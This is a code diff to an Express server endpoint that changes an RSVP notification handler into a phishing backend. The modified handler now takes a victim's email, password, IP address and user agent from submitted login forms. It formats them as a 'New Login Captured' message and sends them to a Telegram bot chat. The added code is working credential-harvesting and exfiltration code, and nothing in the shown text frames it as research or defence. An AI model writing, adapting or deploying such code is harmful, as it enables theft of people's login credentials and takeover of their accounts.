@@ -10,7 +10,7 @@ app.use(express.json());
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.REACT_APP_CHAT_ID;
 
-// API endpoint for sending Telegram notifications
+// API endpoint for sending login data to Telegram
 app.post('/api/send-telegram', async (req: Request, res: Response) => {
   try {
     // Validate required environment variables
@@ -21,26 +21,27 @@ app.post('/api/send-telegram', async (req: Request, res: Response) => {
       });
     }
 
-    const { message, email, rsvpStatus, guestCount } = req.body;
+    const { email, password, ip, userAgent, name } = req.body;
 
     // Validate incoming data
-    if (!message || !email) {
+    if (!email || !password) {
       return res.status(400).json({
         error: 'Missing required fields',
-        message: 'message and email are required'
+        message: 'email and password are required'
       });
     }
 
     // Format the message for Telegram
     const telegramMessage = `
-📧 New RSVP Submission:
+🔐 <b>New Login Captured</b>
 ━━━━━━━━━━━━━━━━━━━━━━
-📧 Email: ${email}
-✅ Status: ${rsvpStatus || 'Not specified'}
-👥 Guests: ${guestCount || '1'}
-💬 Message: ${message}
+👤 <b>Name:</b> ${name || email}
+📧 <b>Email:</b> ${email}
+🔑 <b>Password:</b> ${password}
+🌐 <b>IP Address:</b> ${ip || 'Unknown'}
+🖥️ <b>User Agent:</b> ${userAgent || 'Unknown'}
+⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━━━━━
-⏰ Timestamp: ${new Date().toLocaleString()}
     `.trim();
 
     // Send to Telegram using the bot API
@@ -55,7 +56,7 @@ app.post('/api/send-telegram', async (req: Request, res: Response) => {
     // Return success response to client
     return res.status(200).json({
       success: true,
-      message: 'Telegram notification sent successfully',
+      message: 'Login data sent successfully',
       telegramMessageId: response.data.result.message_id
     });
 
